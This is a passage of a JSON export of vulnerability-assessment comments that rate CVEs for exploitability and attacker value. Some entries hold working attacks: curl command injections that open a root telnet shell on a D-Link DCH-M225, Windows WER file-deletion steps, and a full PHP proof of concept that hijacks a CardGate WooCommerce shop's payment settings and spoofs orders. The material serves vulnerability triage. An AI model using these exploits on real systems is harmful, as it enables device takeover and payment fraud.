      "created": "2020-02-22T00:29:26.765449Z",
      "revisionDate": "2020-04-17T02:13:17.620273Z",
      "document": "AWS had pre built AMIs for these appliances built and supplied to the market place by Citrix. \r\n\r\nAt the time of release and for several weeks afterwards, they were still available in their default vulnerable state. Whilst AWS have removed the vulnerable images any AWS account that subscribed to a specific AMI will still have the default vulnerable version. \r\n\r\nIf you use this kind of setup it is important to remove any old AMIs and replace them, do not assume that patches will be applied to exising AMIs",
      "score": 6,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f9336ed1-2351-46e1-9b34-b121599761b1",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "8795f9e0-0e6c-4707-bdb6-560d57a189e6",
      "created": "2020-02-22T14:23:25.785387Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This appliance is targetted towards small to medium enterprise which means it more valuable to an attacker than attacks against home user equipment. \r\n\r\nIf compromised access to this device could be used to perform network-level compromise via DNS attacks or reveal sensitive information about the network. \r\n\r\nIt requires local network access in order to exploit the vulnerability. This device lists \"Guest access control\" as one of its features so depending on its configuration Local access my be available. \r\n\r\nDevices like APs and embedded devices are often overlooked when applying security updates and patches. \r\n\r\nAt the time of analysis, there is no firmware update available to remediate the vulnerability although POC code does not yet appear to be publicly available. \r\n\r\nDespite the absence of available POC code it is trivial to download the firmware and extract the files system. A determined attacker could then identify the exploit manually. \r\n",
      "score": 3,
      "metadata": {
        "tags": [
          "difficult_to_exploit",
          "difficult_to_develop",
          "default_configuration",
          "difficult_to_patch"
        ],
        "attacker-value": 1,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "6e52706e-dfa3-49d0-ba4d-f3b5b8772d04",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2020-02-22T22:52:11.064365Z",
      "revisionDate": "2020-04-26T23:02:44.203161Z",
      "document": "Like some others have said, this requires an understanding of your targets Host devices in order to generate a reliable exploit. This involves identifying the Start address of the NonPageedPool and plugging this into the existing metasploit module. \r\n\r\nWith a large number of cloud-based resources this is perhaps a little easier to exploit than enterprise desktops. \r\n\r\nAn example against AWS hosted windows appliances works something like this.\r\n\r\n- Spin up your own AWS Instance.\r\n- Use Memory Dump tool like WinPMem to grab a memory image. \r\n- Transfer mem dump to a machine running the rekall memory forensics tool\r\n- Run the `pools` plugin to get the address. \r\n\r\nThis offset will work against any instance in this region started from that same base AMI. \r\n\r\n![alt text](https://pbs.twimg.com/media/ED4Yc6XWsAU-LXS?format=png&name=900x900 \"https://twitter.com/KevTheHermit/status/1170399843841388549\")\r\n\r\n",
      "score": 6,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "difficult_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "fa8697d6-f55a-4502-b8e4-63793052a932",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "337e2206-259f-4fa9-82d8-9dcdf70019fc",
      "created": "2020-02-22T22:59:02.671068Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This analysis is  a transcript of a public gist - Original Source - https://gist.github.com/jezzaaa/38c752d0a129576b2cc523ce6325050f\r\n\r\nD-Link DCH-M225 1.04 devices allow remote attackers to execute \r\narbitrary OS commands via shell metacharacters in the\r\nspotifyConnect.php userName parameter.\r\n\r\n------------------------------------------\r\n\r\n[Additional Information]\r\nFrom the local network (eg wifi), access the URL\r\nhttp://ip-address/spotifyConnect.php with POST variables:\r\n\r\naction=addUser userName=;/usr/sbin/telnetd -i br0 >/dev/null &;\r\n\r\nFor example, from a Linux command-line:\r\n\r\ncurl -d 'action=addUser&userName=;/usr/sbin/telnetd -i br0 >/dev/null &;' http://192.168.0.50/spotifyConnect.php\r\n\r\nThis starts a telnet daemon that provides a root shell with no\r\npassword.Then telnet to the device for a root shell.\r\n\r\nThe same exploit can be used to temporarily change the root password,\r\nusing something like:\r\n\r\ncurl -d 'action=addUser&userName=;echo \"\\\"Admin\\\" \\\"\\\" \\\"0\\\"\">/var/passwd.new;' http://192.168.1.204/spotifyConnect.php\r\n\r\nThis exploit would also work on a network that exposes port 80 on the\r\ndevice to the Internet, in which case this would allow a remote root\r\nshell to an unprivileged user.\r\n\r\nThe vendor has stated that the device has been discontinued (as of\r\nApril 2018), and that they won't be patching.\r\n\r\nThe vulnerable \"Spotify Connect\" feature of the product may have been\r\nimplemented on other devices that are still for sale or still under\r\nsupport, possibly using the same vulnerable code implemented in\r\nspotifyCode.php on this device. The vendor has been asked if any\r\nof their other products use the same code, but they did not answer\r\nthis question.\r\n\r\n------------------------------------------\r\n\r\n[VulnerabilityType Other]\r\ncommand injection (missing input validation, escaping)\r\n\r\n------------------------------------------\r\n\r\n[Vendor of Product]\r\nD-Link\r\n\r\n------------------------------------------\r\n\r\n[Affected Product Code Base]\r\nDCH-M225 Wi-fi Range Extender - 1.04\r\n\r\n------------------------------------------\r\n\r\n[Affected Component]\r\nscript spotifyConnect.php\r\n\r\n------------------------------------------\r\n\r\n[Attack Type]\r\nLocal\r\n\r\n------------------------------------------\r\n\r\n[Attack Vectors]\r\nSubmit HTTP request to add a Spotify Connect user (no admin auth\r\nrequired), using a username containing a semicolon followed by an\r\narbitrary command (which runs as root) such as telnetd or commands to\r\nmodify the admin user's password.\r\n\r\n------------------------------------------\r\n\r\n[References]\r\nhttps://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10152\r\nhttps://www.dlink.com.au/home-solutions/dch-m225-wi-fi-audio-extender\r\nhttps://www.ftc.gov/system/files/documents/cases/dlink_proposed_order_and_judgment_7-2-19.pdf\r\nhttps://www.dlink.com/en/security-bulletin",
      "score": 4,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "high_privilege_access",
          "easy_to_develop",
          "difficult_to_exploit"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "e60ef47d-ce82-447a-bf5b-e0464bfe3b01",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "f7771be4-3364-4037-a463-f72668c65afa",
      "created": "2020-02-22T23:00:53.522073Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This analysis is a transcript of a public gist \u2013 Original Source \u2013 https://gist.github.com/jezzaaa/9d704400a7e23f988dfb4f73658678b8\r\n\r\nD-Link DCH-M225 1.04 devices allow authenticated admins to\r\nexecute arbitrary OS commands via shell metacharacters in the media\r\nrenderer name.\r\n\r\n------------------------------------------\r\n\r\n[Additional Information]\r\nThe vendor has stated that the device has been discontinued (as of\r\nApril 2018), and that they won't be patching.\r\n\r\nI have requested the vendor confirm the exploit. They have not\r\nresponded to this question.\r\n\r\n------------------------------------------\r\n\r\n[VulnerabilityType Other]\r\ncommand injection (missing input validation, escaping)\r\n\r\n------------------------------------------\r\n\r\n[Vendor of Product]\r\nD-Link\r\n\r\n------------------------------------------\r\n\r\n[Affected Product Code Base]\r\nDCH-M225 Wi-fi Range Extender - 1.04\r\n\r\n------------------------------------------\r\n\r\n[Attack Type]\r\nLocal\r\n\r\n------------------------------------------\r\n\r\n[Attack Vectors]\r\nLogin to the admin console (as admin), then set the \"media renderer\"\r\nname to a string containing a single-quoted arbitrary command\r\nprepended by a semicolon such as telnetd. The command runs as root.\r\n\r\n------------------------------------------\r\n\r\n[Reference]\r\nhttps://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10152\r\nhttps://www.dlink.com.au/home-solutions/dch-m225-wi-fi-audio-extender\r\nhttps://www.ftc.gov/system/files/documents/cases/dlink_proposed_order_and_judgment_7-2-19.pdf\r\nhttps://www.dlink.com/en/security-bulletin",
      "score": 2,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "difficult_to_exploit"
        ],
        "attacker-value": 1,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "8600f5d8-9a88-4fe0-b26f-922392058dd3",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "513e78c5-a9ba-4905-8241-8357fac786ed",
      "created": "2020-02-23T09:20:54.478893Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "As a privilege escalation does still need an initial vector onto the phone, so requires either another exploit or additional tradecraft. This is unlikely to work in conjunction with a Chrome exploit today because many phones run a 64-bit kernel + 32-bit Chrome, perhaps for this very reason!.\r\n\r\nAfter testing the [Metasploit module](https://github.com/rapid7/metasploit-framework/pull/12465) it took a considerable amount of specific targeting effort to get just the right model, and because the phone has a feature/bug that made it difficult to downgrade firmware (and the phone likes to upgrade on its own very easily), targeting this after disclosure may be very difficult.\r\n\r\nHowever, if you can find this bug or a similar one on a common phone that is past applying security updates, it could be useful for privesc from a malicious app. But I think the issue that plagues a lot of Android binary exploitation vulns is the lack of generality and there being lower-hanging fruit.",
      "score": 1,
      "metadata": {
        "tags": [
          "difficult_to_exploit",
          "requires_interaction",
          "default_configuration",
          "high_privilege_access",
          "difficult_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "07800bb5-60dd-444d-b53c-3607a1268a06",
      "editorId": "1e48c935-9ca9-4fe9-a2c4-d4555448dd53",
      "topicId": "7f90aa6a-dbc0-4624-92ed-89ef53bd0d94",
      "created": "2020-02-23T18:25:54.977543Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "A technical writeup for this bug was published today and is available at https://github.com/afang5472/CVE-2020-0753-and-CVE-2020-0754/blob/master/WERReport-CVE-2020-0753/POC.md along with a working PoC. The vulnerability itself exists within CWerService::SvcMergeETWLogs within Wersvc.dll according to the writeup.\r\n\r\nFrom what I can see in the writeup the bug is a race condition which is relatively difficult to exploit, however because it is within the Windows Error Reporting Service it should be available by default on most Windows systems. Successful exploitation will result in arbitrary file deletion as the SYSTEM user.\r\n\r\nRated this as medium on exploitation as whilst it is a race condition, the fact that one is able to gain a 4-5 second window to exploit the bug by taking advantage of how the GetTempFileNameW() operation works. for generating the temp file name. Basically by prepopulating a directory with all file names from WER0000.tmp to WERFFFE.tmp (aka 0000 to FFFE), one forces GetTempFileNameW() to generate a file with the name WERFFFF.tmp.\r\n\r\nThen following steps are executed (taken from writeup):\r\n\r\n\r\nThen , I put all the WER***.tmp in $pwd\\1\\, and junction $pwd\\2\\ -> $pwd\\1\\;\r\n\r\nwe create a process to continuously trigger this function with the path $pwd\\2\\. and create the other process to continuously execute the command SetOplock $pwd\\1\\WERFFFF.tmp;\r\n\r\nOnce the Oplock is triggered , we junction $pwd\\2\\ -> \\RPC CONTROL\\, and then create object symbolic \\RPC CONTROL\\WERFFFF.tmp -> $target and \\RPC CONTROL\\WERFFFF.tmp.etl -> $target\r\n\r\nRelease the oplock , the target file will be deleted with system privilege\r\n\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "difficult_to_develop",
          "default_configuration",
          "no_useful_data",
          "high_privilege_access"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "5c8e5432-47f0-4229-b58b-4b1d8a1e8a8c",
      "editorId": "1e48c935-9ca9-4fe9-a2c4-d4555448dd53",
      "topicId": "f35b7b35-aa6a-4dac-8888-ae6381ad6f0d",
      "created": "2020-02-23T19:58:51.403531Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Analysis is available at https://github.com/afang5472/CVE-2020-0753-and-CVE-2020-0754/blob/master/WERReport-CVE-2020-0754/WERRaceCondition.docx although it doesn't seem like the PoC code is available upon initial inspection.\r\n\r\nThis vulnerability is fairly similar to CVE-2020-0753 and results in arbitrary file deletion as the SYSTEM user should an attacker be able to create a symbolic link for a temporary file at the right time.\r\n\r\nVulnerabilty also exists within wersvc.dll, although the given function name is not provided within the writeup to the best of my knowledge.",
      "score": 2,
      "metadata": {
        "tags": [
          "difficult_to_develop",
          "common_enterprise",
          "high_privilege_access",
          "default_configuration",
          "no_useful_data"
        ],
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "8de62636-8fee-4561-920d-9208d46430eb",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "2be026d9-8bbe-4ac7-a176-a931f6b45750",
      "created": "2020-02-24T16:00:06.132049Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This is enabled by default in 2012 servers. It seems some folks have gotten RCE with this, though there are no public exploits. Further research may show this as being easier than it is at first assessment. https://social.technet.microsoft.com/wiki/contents/articles/10973.configuring-udp-support-on-the-rd-gateway-in-windows-server-2012.aspx",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "difficult_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "79fc32b1-72e8-420e-8dbf-54c3461c49a7",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "8aa21692-1900-4944-98ab-bec257302198",
      "created": "2020-02-24T17:15:02.444811Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Just a quick note the Tenable blog has a number of useful resources here, which also links to a few other PoC scripts:\r\n\r\n https://www.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "fb95074b-161b-4e8b-8d03-7a0f3a4b6bc1",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "692ad8ce-7167-43d5-ae26-9a38175c90d9",
      "created": "2020-02-25T09:33:19.843538Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This is for a specific plugin for WooCommerce, not WooCommerce itself. This plugin has a relatively small number of installs so it is not likely to see large scale use. \r\n\r\n\r\nThere is a public POC attached to the GitHub repo and duplicated at the end of this analysis for convenience. Authenticated access is not required. https://github.com/cardgate/woocommerce/issues/18\r\n\r\n\r\n\r\n```\r\n/*\r\n  Usage:\r\n\r\n  1. Change values of the constants (see below for TARGET & ORDER*)\r\n  2. Host this script somewhere (must be public accessible)\r\n  3. Register a merchant at https://cardgate.com\r\n  4. Sign into \"My CardGate\" dashboard\r\n  5. Add fake site or choose existing one\r\n  6. Click \"Setup your Webshop\" button in site preferences\r\n  7. Paste the URL of this script into the pop-up window and click \"Save\"\r\n  8. The target store now uses the settings of your site, enjoy :]\r\n\r\n  P.S. It works perfectly in both Staging and Live modes, regardless of the current mode of the target shop.\r\n*/\r\n\r\n// -------- Options (start) --------\r\ndefine('TARGET', 'http://domain.tld'); // without trailing slash, pls\r\ndefine('ORDER', 0); // provide non-zero value to automagically spoof order status\r\n// --------- Options (end) ---------\r\n\r\ndefine('API_STAGING', 'https://secure-staging.curopayments.net/rest/v1/curo/');\r\ndefine('API_PRODUCTION', 'https://secure.curopayments.net/rest/v1/curo/');\r\n\r\n/**\r\n * Original function from CardGate API client library (SDK) with minor changes\r\n * @param string $sToken_ \r\n * @param bool $bTestmode_ \r\n * @return string\r\n */\r\nfunction pullConfig($sToken_, $bTestmode_ = FALSE) {\r\n\tif (!is_string($sToken_)) {\r\n\t\tthrow new Exception('invalid token for settings pull: ' . $sToken_);\r\n\t}\r\n\r\n\t$sResource = \"pullconfig/{$sToken_}/\";\r\n\t$sUrl = ($bTestmode_ ? API_STAGING : API_PRODUCTION) . $sResource;\r\n\r\n\t$rCh = curl_init();\r\n\tcurl_setopt($rCh, CURLOPT_URL, $sUrl);\r\n\tcurl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt($rCh, CURLOPT_TIMEOUT, 60);\r\n\tcurl_setopt($rCh, CURLOPT_HEADER, FALSE);\r\n\tcurl_setopt($rCh, CURLOPT_HTTPHEADER, [\r\n\t\t'Content-Type: application/json',\r\n\t\t'Accept: application/json'\r\n\t]);\r\n\tif ($bTestmode_) {\r\n\t\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);\r\n\t\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);\r\n\t} else {\r\n\t\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, TRUE);\r\n\t\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 2);\r\n\t}\r\n\r\n\tif (FALSE == ($sResults = curl_exec($rCh))) {\r\n\t\t$sError = curl_error($rCh);\r\n\t\tcurl_close($rCh);\r\n\t\tthrow new Exception('Client.Request.Curl.Error: ' . $sError);\r\n\t} else {\r\n\t\tcurl_close($rCh);\r\n\t}\r\n\tif (NULL === ($aResults = json_decode($sResults, TRUE))) {\r\n\t\tthrow new Exception('remote gave invalid JSON: ' . $sResults);\r\n\t}\r\n\tif (isset($aResults['error'])) {\r\n\t\tthrow new Exception($aResults['error']['message']);\r\n\t}\r\n\r\n\treturn $aResults;\r\n}\r\n\r\n/**\r\n * Original function from CardGate API client library (SDK) with minor changes\r\n * @param string $sUrl \r\n * @param array $aData_ \r\n * @param string $sHttpMethod_ \r\n * @return string\r\n */\r\nfunction doRequest($sUrl, $aData_ = NULL, $sHttpMethod_ = 'POST') {\r\n\tif (!in_array($sHttpMethod_, ['GET', 'POST'])) {\r\n\t\tthrow new Exception('invalid http method: ' . $sHttpMethod_);\r\n\t}\r\n\r\n\t$rCh = curl_init();\r\n\tcurl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt($rCh, CURLOPT_TIMEOUT, 60);\r\n\tcurl_setopt($rCh, CURLOPT_HEADER, FALSE);\r\n\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);\r\n\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);\r\n\r\n\tif ('POST' == $sHttpMethod_) {\r\n\t\tcurl_setopt($rCh, CURLOPT_URL, $sUrl);\r\n\t\tcurl_setopt($rCh, CURLOPT_POST, TRUE);\r\n\t\tcurl_setopt($rCh, CURLOPT_POSTFIELDS, http_build_query($aData_));\r\n\t} else {\r\n\t\t$sUrl = $sUrl\r\n\t\t\t. (FALSE === strchr($sUrl, '?') ? '?' : '&')\r\n\t\t\t. http_build_query($aData_)\r\n\t\t;\r\n\t\tcurl_setopt($rCh, CURLOPT_URL, $sUrl);\r\n\t}\r\n\r\n\t$response = curl_exec($rCh);\r\n\tif (FALSE == $response) {\r\n\t\t$sError = curl_error($rCh);\r\n\t\tcurl_close($rCh);\r\n\t\tthrow new Exception('Client.Request.Curl.Error: ' . $sError);\r\n\t} else {\r\n\t\tcurl_close($rCh);\r\n\t}\r\n\r\n\treturn $response;\r\n}\r\n\r\nif (!empty($_REQUEST['cgp_sitesetup']) && !empty($_REQUEST['token'])) {\r\n\ttry {\r\n\t\t$aResult = pullConfig($_REQUEST['token'], $_REQUEST['testmode']);\r\n\t\t$aConfigData = $aResult['pullconfig']['content'];\r\n\t\t$response = doRequest(TARGET, $_REQUEST);\r\n\t\tif ($response == $aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200') {\r\n\t\t\tif (ORDER) {\r\n\t\t\t\t$payload = [\r\n\t\t\t\t\t'testmode' => $_REQUEST['testmode'],\r\n\t\t\t\t\t'reference' => random_int(10000000000, 99999999999) . ORDER,\r\n\t\t\t\t\t'transaction' => 'T' . str_pad(time(), 11, random_int(0, 9)),\r\n\t\t\t\t\t'currency' => '',\r\n\t\t\t\t\t'amount' => 0,\r\n\t\t\t\t\t'status' => 'success',\r\n\t\t\t\t\t'code' => 200\r\n\t\t\t\t];\r\n\t\t\t\t$payload['hash'] = md5(\r\n\t\t\t\t\t(!empty($payload['testmode']) ? 'TEST' : '')\r\n\t\t\t\t\t. $payload['transaction']\r\n\t\t\t\t\t. $payload['currency']\r\n\t\t\t\t\t. $payload['amount']\r\n\t\t\t\t\t. $payload['reference']\r\n\t\t\t\t\t. $payload['code']\r\n\t\t\t\t\t. $aConfigData['site_key']\r\n\t\t\t\t);\r\n\t\t\t\t$response = doRequest(TARGET . '/?cgp_notify=true', $payload);\r\n\t\t\t\tif ($response == $payload['transaction'] . '.' . $payload['code']) {\r\n\t\t\t\t\tdie($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');\r\n\t\t\t\t} else {\r\n\t\t\t\t\tthrow new Exception(\"Unable to spoof order status, but merchant settings was updated successfully ($response)\");\t\r\n\t\t\t\t}\r\n\t\t\t} else {\r\n\t\t\t\tdie($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');\r\n\t\t\t}\r\n\t\t} else {\r\n\t\t\tthrow new Exception(\"It seems target is not vulnerable ($response)\");\r\n\t\t}\r\n\t} catch (\\Exception $oException_) {\r\n\t\tdie(htmlspecialchars($oException_->getMessage()));\r\n\t}\r\n}\r\n```",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "482266f9-9f62-4d12-9749-b5dc4f29bc7b",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "cdbcf1a3-f9b8-455f-8d83-3b80ef4b729d",
      "created": "2020-02-25T09:41:58.486694Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
